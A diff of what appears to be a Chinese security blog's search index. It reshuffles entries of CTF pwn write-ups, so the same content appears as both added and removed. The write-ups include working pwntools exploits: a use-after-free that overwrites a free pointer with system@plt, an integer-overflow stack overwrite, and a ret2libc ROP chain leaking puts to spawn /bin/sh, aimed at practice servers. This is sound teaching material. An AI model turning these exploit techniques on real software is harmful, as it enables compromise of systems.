@@ -64,6 +64,19 @@
       </categories>
   </entry>
   <entry>
+    <title>C语言中常见漏洞点</title>
+    <url>/article/C/</url>
+    <content><![CDATA[<h1 id="记录常见漏洞点"><a href="#记录常见漏洞点" class="headerlink" title="记录常见漏洞点"></a>记录常见漏洞点</h1><span id="more"></span>
+
+<h1 id="C语言函数"><a href="#C语言函数" class="headerlink" title="C语言函数"></a>C语言函数</h1><h2 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h2><p>计算 ascii 字符串长度的函数</p>
+<p>这个函数在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的</p>
+<h2 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h2><p>在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code>，能造成 NULL byte off-by-one </p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+  </entry>
+  <entry>
     <title>CISCN_2021</title>
     <url>/article/CISCN_2021/</url>
     <content><![CDATA[<h1 id="CISCN-2021"><a href="#CISCN-2021" class="headerlink" title="CISCN_2021"></a>CISCN_2021</h1><span id="more"></span>
@@ -136,19 +149,6 @@
 ]]></content>
       <categories>
         <category>比赛WriteUp</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>C语言中常见漏洞点</title>
-    <url>/article/C/</url>
-    <content><![CDATA[<h1 id="记录常见漏洞点"><a href="#记录常见漏洞点" class="headerlink" title="记录常见漏洞点"></a>记录常见漏洞点</h1><span id="more"></span>
-
-<h1 id="C语言函数"><a href="#C语言函数" class="headerlink" title="C语言函数"></a>C语言函数</h1><h2 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h2><p>计算 ascii 字符串长度的函数</p>
-<p>这个函数在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的</p>
-<h2 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h2><p>在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code>，能造成 NULL byte off-by-one </p>
-]]></content>
-      <categories>
-        <category>笔记</category>
       </categories>
   </entry>
   <entry>
@@ -816,6 +816,44 @@
       </tags>
   </entry>
   <entry>
+    <title>CISCN_2019</title>
+    <url>/article/CISCN_2019/</url>
+    <content><![CDATA[<h1 id="ciscn-2019"><a href="#ciscn-2019" class="headerlink" title="ciscn_2019"></a>ciscn_2019</h1><span id="more"></span>
+
+<h1 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h1><p>保护</p>
+<p><img src="/.ink//image-20210526120532732.png" alt="image-20210526120532732"></p>
+<p>ida</p>
+<ul>
+<li>new</li>
+</ul>
+<p><img src="/.ink//image-20210526121417172.png" alt="image-20210526121417172"></p>
+<ul>
+<li><p>del</p>
+<p><img src="/.ink//image-20210526121954287.png" alt="image-20210526121954287"></p>
+</li>
+<li><p>dump</p>
+<p><img src="/.ink//image-20210526122032820.png" alt="image-20210526122032820"></p>
+</li>
+</ul>
+<h2 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h2><p>uaf漏洞。程序new之前先malloc了0xC的chunk，用来存放 print 和 free 指针</p>
+<ul>
+<li>1、直接写入数值</li>
+<li>2、写入一个指向string的chunk指针</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>,<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.ink//image-20210526123328831.png" alt="image-20210526123328831"></p>
+<p>根据 fastbin FILO 的特性，执行 free(0)、free(1) ，再new一个string类型，便可以修改 free 指针为 system_plt，同时 string 指针的最后一个字节会被修改为 \n (0x0a)，就刚好指向了 print 指针处，把这个地方修改为 bash。执行 free(0) -&gt; system(‘bash’)，达成getshell</p>
+<p><img src="/.ink//image-20210526124650393.png" alt="image-20210526124650393"></p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_3&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26908</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_n_3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,<span class="type">Type</span>,content,length=<span class="number">0</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Type &gt; &#x27;</span>,<span class="built_in">str</span>(<span class="type">Type</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="type">Type</span> == <span class="number">2</span>:        </span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Length &gt; &#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Value &gt; &#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Value &gt; &#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;bbbb&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="string">&#x27;bash&#x27;</span>+p32(sys_addr),<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>比赛WriteUp</category>
+      </categories>
+  </entry>
+  <entry>
     <title>checksec</title>
     <url>/article/checksec/</url>
     <content><![CDATA[<h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><span id="more"></span>
@@ -854,44 +892,6 @@
       <tags>
         <tag>checksec</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>CISCN_2019</title>
-    <url>/article/CISCN_2019/</url>
-    <content><![CDATA[<h1 id="ciscn-2019"><a href="#ciscn-2019" class="headerlink" title="ciscn_2019"></a>ciscn_2019</h1><span id="more"></span>
-
-<h1 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h1><p>保护</p>
-<p><img src="/.ink//image-20210526120532732.png" alt="image-20210526120532732"></p>
-<p>ida</p>
-<ul>
-<li>new</li>
-</ul>
-<p><img src="/.ink//image-20210526121417172.png" alt="image-20210526121417172"></p>
-<ul>
-<li><p>del</p>
-<p><img src="/.ink//image-20210526121954287.png" alt="image-20210526121954287"></p>
-</li>
-<li><p>dump</p>
-<p><img src="/.ink//image-20210526122032820.png" alt="image-20210526122032820"></p>
-</li>
-</ul>
-<h2 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h2><p>uaf漏洞。程序new之前先malloc了0xC的chunk，用来存放 print 和 free 指针</p>
-<ul>
-<li>1、直接写入数值</li>
-<li>2、写入一个指向string的chunk指针</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>,<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/.ink//image-20210526123328831.png" alt="image-20210526123328831"></p>
-<p>根据 fastbin FILO 的特性，执行 free(0)、free(1) ，再new一个string类型，便可以修改 free 指针为 system_plt，同时 string 指针的最后一个字节会被修改为 \n (0x0a)，就刚好指向了 print 指针处，把这个地方修改为 bash。执行 free(0) -&gt; system(‘bash’)，达成getshell</p>
-<p><img src="/.ink//image-20210526124650393.png" alt="image-20210526124650393"></p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_3&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26908</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_n_3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,<span class="type">Type</span>,content,length=<span class="number">0</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Type &gt; &#x27;</span>,<span class="built_in">str</span>(<span class="type">Type</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="type">Type</span> == <span class="number">2</span>:        </span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Length &gt; &#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Value &gt; &#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Value &gt; &#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;bbbb&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="string">&#x27;bash&#x27;</span>+p32(sys_addr),<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>比赛WriteUp</category>
-      </categories>
   </entry>
   <entry>
     <title>Hello World</title>
@@ -1151,40 +1151,6 @@
       </tags>
   </entry>
   <entry>
-    <title>整形溢出</title>
-    <url>/article/Shaping%20overflow/</url>
-    <content><![CDATA[<h1 id="整形溢出"><a href="#整形溢出" class="headerlink" title="整形溢出"></a>整形溢出</h1><span id="more"></span>
-<h2 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h2><p>来自buuctf</p>
-<p>先看ida</p>
-<p><img src="https://img-blog.csdnimg.cn/20201123233054809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>buf缓冲区大小为408h，而read读取大小为400h，比buf要小，所以不能进行简单的缓冲区栈溢出。</p>
-<p>再看name_check函数，v3是int8类型的变量，1111 1111 = 0xFF = 255。当0xFF +1的时侯，变量发生整形溢出，0x100 = 256 此时v3的数值为零（0000 0000），但是这只是显示了一个字节，其实再计算机里面会溢出，前面会进行进位操作变成 1 0000 0000。</p>
-<p>同时还要满足3&lt; v3 &lt;8 的条件，这时候可以确定溢出数值是在 0x104~0x107 中</p>
-<p><img src="https://img-blog.csdnimg.cn/20201123233312233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>后面的strcpy()函数将s复制给dest,看到dest的偏移为0x11+4</p>
-<p>程序中给出了/bin/sh的地址</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26213</span>)</span><br><span class="line">sys_addr = <span class="number">0x08048594</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x15</span>) + p32(sys_addr) + <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x104</span>-<span class="number">0x19</span>) <span class="comment"># 0x15 + 0x4 + n = 0x104 </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">r.recvuntil(<span class="string">&#x27;name:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-
-<p>Int8, 等于Byte, 占1个字节.</p>
-<p>　   Int16, 等于short, 占2个字节. -32768 32767</p>
-<p>　   Int32, 等于int, 占4个字节. -2147483648 2147483647</p>
-<p>　   Int64, 等于long, 占8个字节. -9223372036854775808 9223372036854775807</p>
-<p>   　这样, 看起来比short,int,long更加直观些!</p>
-<p>　　 另外, 还有一个Byte, 它等于byte, 0 - 255.</p>
-<p>　　所以说这里的v3是占一个字节的，一个字节是由8位二进制决定的。</p>
-<p>　　例如：0000 0000 就是一个字节，代表0，1111 1111 也是一个字节，代表255.</p>
-<p><a href="https://www.jianshu.com/p/757fe6d91669">参考1</a><br><a href="https://www.cnblogs.com/bhxdn/p/12572580.html">参考2</a></p>
-]]></content>
-      <categories>
-        <category>WriteUp</category>
-      </categories>
-      <tags>
-        <tag>整形溢出</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>栈迁移</title>
     <url>/article/Stack%20migration/</url>
     <content><![CDATA[<h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><span id="more"></span>
@@ -1242,6 +1208,74 @@
       <tags>
         <tag>栈迁移</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>整形溢出</title>
+    <url>/article/Shaping%20overflow/</url>
+    <content><![CDATA[<h1 id="整形溢出"><a href="#整形溢出" class="headerlink" title="整形溢出"></a>整形溢出</h1><span id="more"></span>
+<h2 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h2><p>来自buuctf</p>
+<p>先看ida</p>
+<p><img src="https://img-blog.csdnimg.cn/20201123233054809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>buf缓冲区大小为408h，而read读取大小为400h，比buf要小，所以不能进行简单的缓冲区栈溢出。</p>
+<p>再看name_check函数，v3是int8类型的变量，1111 1111 = 0xFF = 255。当0xFF +1的时侯，变量发生整形溢出，0x100 = 256 此时v3的数值为零（0000 0000），但是这只是显示了一个字节，其实再计算机里面会溢出，前面会进行进位操作变成 1 0000 0000。</p>
+<p>同时还要满足3&lt; v3 &lt;8 的条件，这时候可以确定溢出数值是在 0x104~0x107 中</p>
+<p><img src="https://img-blog.csdnimg.cn/20201123233312233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>后面的strcpy()函数将s复制给dest,看到dest的偏移为0x11+4</p>
+<p>程序中给出了/bin/sh的地址</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26213</span>)</span><br><span class="line">sys_addr = <span class="number">0x08048594</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x15</span>) + p32(sys_addr) + <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x104</span>-<span class="number">0x19</span>) <span class="comment"># 0x15 + 0x4 + n = 0x104 </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">r.recvuntil(<span class="string">&#x27;name:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<p>Int8, 等于Byte, 占1个字节.</p>
+<p>　   Int16, 等于short, 占2个字节. -32768 32767</p>
+<p>　   Int32, 等于int, 占4个字节. -2147483648 2147483647</p>
+<p>　   Int64, 等于long, 占8个字节. -9223372036854775808 9223372036854775807</p>
+<p>   　这样, 看起来比short,int,long更加直观些!</p>
+<p>　　 另外, 还有一个Byte, 它等于byte, 0 - 255.</p>
+<p>　　所以说这里的v3是占一个字节的，一个字节是由8位二进制决定的。</p>
+<p>　　例如：0000 0000 就是一个字节，代表0，1111 1111 也是一个字节，代表255.</p>
+<p><a href="https://www.jianshu.com/p/757fe6d91669">参考1</a><br><a href="https://www.cnblogs.com/bhxdn/p/12572580.html">参考2</a></p>
+]]></content>
+      <categories>
+        <category>WriteUp</category>
+      </categories>
+      <tags>
+        <tag>整形溢出</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>湖湘杯hxb_Pwn</title>
+    <url>/article/hxb_Pwn/</url>
+    <content><![CDATA[<h1 id="湖湘杯hxb-pwn"><a href="#湖湘杯hxb-pwn" class="headerlink" title="湖湘杯hxb_pwn"></a>湖湘杯hxb_pwn</h1><span id="more"></span>
+<h2 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h2><h3 id="pwn-libc"><a href="#pwn-libc" class="headerlink" title="pwn_libc"></a>pwn_libc</h3><p>ida</p>
+<p><img src="https://img-blog.csdnimg.cn/20201108200522719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>16次循环<br>下面if判断v12&lt;=0x20<br>所以写</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	n.sendline(<span class="string">&quot;32&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>跟进if下面的函数</p>
+<p><img src="https://img-blog.csdnimg.cn/20201108200913518.png#pic_center" alt="在这里插入图片描述"></p>
+<p>这里变量的栈是空栈0h，所以offset只需要64bit程序的8个就行。<br>再然后a * a1，所以传参需要double 0x20，也就是0x40<br><code>ROPgadget --binary pwn_printf</code><br>找到pop_rdi_ret的地址<br>复习一下libc64_payload公式</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">64</span>位payload: payload = <span class="string">&quot;a&quot;</span>*offset + p64(pop_rdi) + p64(got) + p64(plt) + p64(ret_addr/main)</span><br></pre></td></tr></table></figure>
+
+
+<p>写exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401213</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	n.sendline(<span class="string">&quot;32&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(<span class="number">0x40</span>) + p64(<span class="number">0x4007C6</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;You will find this game very interesting\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(sh.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure>
+
+<p>这就print出来了puts的地址</p>
+<p><img src="https://img-blog.csdnimg.cn/20201108201921266.png#pic_center" alt="在这里插入图片描述"></p>
+<p>到<a href="https://libc.blukat.me/">libc database search</a>查一下相关libc信息</p>
+<p>在套用一下公式</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = puts_addr - <span class="number">0x080a30</span>    <span class="comment"># -libc_Offset的puts</span></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + <span class="number">0x04f4e0</span>   <span class="comment"># +libc_Offset的system</span></span><br><span class="line"></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1b40fa</span>		<span class="comment"># +libc_Offset的bin/sh</span></span><br></pre></td></tr></table></figure>
+
+<p>复习一下libc64_getshell公式</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">getshell: <span class="string">&quot;a&quot;</span>*offset + p64(ret) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr)</span><br></pre></td></tr></table></figure>
+
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401213</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	sh.sendline(<span class="string">&quot;32&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(<span class="number">0x40</span>) + p64(<span class="number">0x4007C6</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;You will find this game very interesting\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(sh.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - <span class="number">0x080a30</span> <span class="comment">#0x6f6a0</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x04f4e0</span> <span class="comment">#0x0453a0</span></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1b40fa</span> <span class="comment">#0x18ce17 </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x4007C6</span>) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>比赛WriteUp</category>
+      </categories>
   </entry>
   <entry>
     <title>汇编</title>
@@ -1320,40 +1354,6 @@
 <p>输出结果：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">15</span> +</span><br><span class="line"><span class="number">16</span> <span class="number">1</span></span><br><span class="line"><span class="number">13</span> <span class="number">3</span></span><br><span class="line"><span class="number">19</span> <span class="number">3</span></span><br><span class="line"><span class="number">24</span> <span class="number">5</span></span><br><span class="line"><span class="number">9</span> @</span><br><span class="line"><span class="number">5</span> M</span><br><span class="line"><span class="number">8</span> M</span><br><span class="line"><span class="number">18</span> R</span><br><span class="line"><span class="number">22</span> T</span><br><span class="line"><span class="number">14</span> X</span><br><span class="line"><span class="number">7</span> _</span><br><span class="line"><span class="number">12</span> _</span><br><span class="line"><span class="number">17</span> _</span><br><span class="line"><span class="number">21</span> _</span><br><span class="line"><span class="number">2</span> a</span><br><span class="line"><span class="number">23</span> e</span><br><span class="line"><span class="number">0</span> f</span><br><span class="line"><span class="number">3</span> g</span><br><span class="line"><span class="number">11</span> h</span><br><span class="line"><span class="number">1</span> l</span><br><span class="line"><span class="number">10</span> t</span><br><span class="line"><span class="number">25</span> t</span><br><span class="line"><span class="number">20</span> v</span><br><span class="line"><span class="number">6</span> y</span><br><span class="line"><span class="number">4</span> &#123;</span><br><span class="line"><span class="number">26</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>手动操作一下就ok</p>
-]]></content>
-      <categories>
-        <category>比赛WriteUp</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>湖湘杯hxb_Pwn</title>
-    <url>/article/hxb_Pwn/</url>
-    <content><![CDATA[<h1 id="湖湘杯hxb-pwn"><a href="#湖湘杯hxb-pwn" class="headerlink" title="湖湘杯hxb_pwn"></a>湖湘杯hxb_pwn</h1><span id="more"></span>
-<h2 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h2><h3 id="pwn-libc"><a href="#pwn-libc" class="headerlink" title="pwn_libc"></a>pwn_libc</h3><p>ida</p>
